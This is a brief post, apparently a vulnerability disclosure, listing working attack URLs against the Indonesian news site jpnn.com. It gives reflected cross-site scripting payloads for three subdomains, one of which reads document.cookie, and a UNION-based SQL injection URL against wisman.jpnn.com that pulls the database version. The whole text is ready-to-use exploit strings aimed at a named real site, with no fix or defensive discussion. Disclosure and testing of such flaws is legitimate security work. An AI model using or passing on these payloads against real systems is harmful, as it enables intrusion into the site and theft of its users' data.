Xss in JPNN.com



Vuln Url 


https://www.jpnn.com/search?q=%22%3E%3Cimg+src%3Dxss+onerror%3Dalert(document.domain)%3E
https://alpha.jpnn.com/search?q=%22%3E%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&sa=jpnn_search&tab=jpnn_search
https://foto.jpnn.com/search?q=%22%3E%3Cscript%3Ealert%28%271%27%29%3B%3C%2Fscript%3E


Sql Injection *.JPNN.com

Vuln URL = http://wisman.jpnn.com/Penerbangan_langsung?bnd=-10%27+union+all+select+1,version(),3,4,5,6,7,8+--+